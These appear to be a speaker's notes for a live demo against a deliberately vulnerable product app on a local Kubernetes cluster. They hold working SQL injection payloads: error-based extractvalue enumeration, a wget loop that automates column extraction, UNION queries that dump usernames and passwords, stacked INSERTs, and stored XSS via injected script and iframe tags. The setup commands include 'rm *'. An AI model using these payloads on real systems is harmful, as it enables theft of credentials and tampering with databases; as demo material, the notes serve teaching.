# RESET

```
set +o history
kind delete cluster
docker pull nginx
docker pull nginx/nginx-ingress:2.1.1
docker pull ghcr.io/learnk8s/f5-microservices-march-three
helm repo remove nginx-stable
rm *
cp /Users/cns/httpdocs/talks/nginx-livedemo/cluster-config.yaml .
reset
kind create cluster --config cluster-config.yaml
kind load docker-image ghcr.io/learnk8s/f5-microservices-march-three
kind load docker-image nginx/nginx-ingress:2.1.1
kind load docker-image nginx
bat cluster-config.yaml
```

# todo:

- create deployment
- create node port service

# leak data

theres a few ways we can leak data out,

## error

we can simply corrupt the query to see if an error attack might work

```
http://localhost/product/1"a
```

ok, great news errors are surfaced we'll use `extractvalue()` its a simple way to is an easy way to generate an error and allow us to leak things, it only works with single values at a time, and will be truncated a bit, so requires enumerating through them

```
http://localhost/product/1" AND extractvalue(rand(),version())-- //
```

start enumerating through to see the databases

```
http://localhost/product/1" AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 0,1)))-- //
http://localhost/product/1" AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 1,1)))-- //
```

ok, so now we know the database name we is sqltraining, so we can use the same tactic to get the tables in that database

```
http://localhost/product/1" AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema="sqlitraining" LIMIT 0,1)))-- //
```

interesting a users table!

```
http://localhost/product/1" AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema="sqlitraining" LIMIT 1,1)))-- //
```

Now all this enumeration might feel quite laborious, but what if instead use a simple script to do that instead

```bash
for i in {0..20}; do
  wget -q -O - "http://localhost/product/1\" AND extractvalue(rand(),concat(0x3a,(SELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME=\"products\" AND table_schema=\"sqlitraining\" LIMIT ${i},1)))-- //" | grep mysqli_sql_exception | cut -d" " -f9
done
```

it shouldn't take much imagination to figure out how you could automate stealing all rows

# union leak

we don't know how many columns were in the original query so we have to brute force queries to satisfy the original query

```
http://localhost/product/-1" UNION SELECT username FROM users where id=1 -- //
http://localhost/product/-1" UNION SELECT username, password FROM users where id=1 -- //
http://localhost/product/-1" UNION SELECT username, password, username FROM users where id=1 -- //

http://localhost/product/-1" UNION SELECT username,username,password,password,username FROM users where id=1 -- //
```

###

## inserting

```
http://localhost/product/1"; INSERT INTO products(product_name, product_type, description, price) VALUES("hack", "hack", "hack", 1); -- //
```

## inserting with xss

```
http://localhost/product/1"; INSERT INTO products(product_name, product_type, description, price) VALUES("<script>alert('hi')</script>", "hack", "hack", 1); -- //
http://localhost/product/1"; INSERT INTO products(description, product_name, product_type, price) VALUES("<iframe width=560 height=315 src='https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ'></iframe>", "never gonna", "give you up", 1); -- //

```

Similarly you can probably imagine anything else we can do like truncate tables, add users, dump lots of data into a table

http://localhost/product/<iframe width='560' height='315' src='https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ'></iframe>

<iframe sandbox="allow-forms allow-modals allow-popups allow-pointer-lock allow-same-origin allow-scripts" allowfullscreen="true" src="https://www.youtube-nocookie.com/embed/9Auq9mYxFEE?autoplay=1&amp;mute=1&amp;cc=1"></iframe>
# ingress
```bash
helm repo add nginx-stable https://helm.nginx.com/stable

helm install main nginx-stable/nginx-ingress \
 --set controller.enableSnippets=true \
 --set controller.image.pullPolicy=Never \
 --set controller.service.type=NodePort \
 --set controller.service.httpPort.nodePort=30000

```

```
